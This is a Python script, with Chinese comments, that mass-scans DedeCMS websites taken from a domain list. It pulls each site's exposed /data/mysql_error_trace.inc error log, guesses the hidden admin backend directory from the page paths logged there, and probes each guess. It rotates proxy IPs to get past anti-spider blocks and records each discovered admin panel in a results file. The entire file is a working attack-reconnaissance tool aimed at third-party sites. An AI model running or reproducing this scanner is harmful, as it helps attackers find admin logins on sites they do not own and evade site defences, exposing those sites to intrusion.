# -*- coding: utf-8 -*-
### 爆后台路径补充版：通过yourdomain/data/mysql_error_trace.inc猜测类似后台地址。
import re
import os
import requests
from common import utils


is_ip = False
interval = 3600


def my_requests(url, method='get', timeout=15, try_count=3, **args):
    for n in range(try_count):
        try:
            global is_ip, proxies
            if (is_ip):
                response = requests.request(method=method, url=url, headers=utils.get_headers(), proxies=proxies,timeout=timeout,**args)
            else:
                response = requests.request(method=method, url=url, headers=utils.get_headers(), timeout=timeout, **args)
            response.encoding = 'utf-8'
            if response.status_code == 200:
                if "antispider" in response.url:
                    #is_ip = True
                    proxies = getip()
                    print("需要切换IP自动验证:",proxies)
                    continue
                if "passport" in response.url:
                    #baidu_img.识别百度验证码()
                    continue
                return response
            else:
                print(url+'---request err:'+ str(response.status_code))
                return None
        except Exception as e:
            print(e)
            #is_ip = True
            proxies = getip()
            print("IP自动验证:", proxies)
            continue
        print("请求url:%s失败，剩余重试次数：%d" % (url, n))

def getip(method='get', timeout=15, try_count=3, **args):
    url = ""
    response = requests.request(method=method, url=url, headers=utils.get_headers(), timeout=timeout, **args)
    if response.status_code == 200:
        proxies = {'https': response.text.replace('\r\n', '')}
        return proxies


class Unit(object):
    def getfilelist(self, filepath):
        try:
            #parentDirPath = os.path.abspath(os.path.dirname(os.path.split(os.path.realpath(__file__))[0]))
            #path = parentDirPath + filepath
            with open(filepath, "r", encoding='UTF-8') as f:  # 打开文件
                data = f.read().split('\n')
                if len(data) > 0:
                    print('导入数据:'+str(len(data)))
                    return data
                else:
                    print('load txt err')
                    return None
        except Exception as e:
            print('not fond file or err')
            return None

    def create_str_to_txt(self,date, str_data):
        try:
            path_file_name = date
            if not os.path.exists(path_file_name):
                with open(path_file_name, "w") as f:
                    print(f)
            with open(path_file_name, "a") as f:
                f.write(str_data)
        except:
            print('e')


if __name__ == '__main__':
    try:
        filename = "注册扫描结果"
        WordList = Unit().getfilelist('./res/' + filename)
        for txt in WordList:
            try:
                arrary =[]
                words = ['member','plus','m']
                domain_url = txt.replace('\r','')
                select_url = domain_url+"/data/mysql_error_trace.inc"
                response = my_requests(url=select_url)
                if response:
                    response_txt = response.text
                    utl_list = re.findall('(?=Page:).*', response_txt)
                    for last_url in utl_list:
                        last_url = last_url.replace('\r','').replace('Page:','').replace(' ','')
                        last_url = last_url[0:last_url.rfind('?')]
                        if last_url.count('/') >= 2:
                            s = last_url.split('/')[1]
                            if s not in words and s not in arrary and s !='':
                                arrary.append(s)
                                s_url = domain_url + '/' + s + '/'
                                print('try:'+ s_url)
                                response2 = my_requests(url=s_url)
                                if response2:
                                    try:
                                        response2.encoding = response2.apparent_encoding
                                        response2_txt = response2.text
                                        title = re.findall('<title>.*</title>', response2_txt)[0]
                                        if '页面未找到' in title:
                                            continue
                                        Unit().create_str_to_txt('./res/批量爆破织梦后台_成功_补充版.txt',domain_url + '\n' + s_url + '\n'+title + '\n\n')
                                        print(title+'  :  '+ s_url)
                                    except:
                                        continue
                    if len(arrary) == 0:
                        print(domain_url + '未找到相对于目录')
            except:
                continue

    except Exception as e:
        print(e)
        pass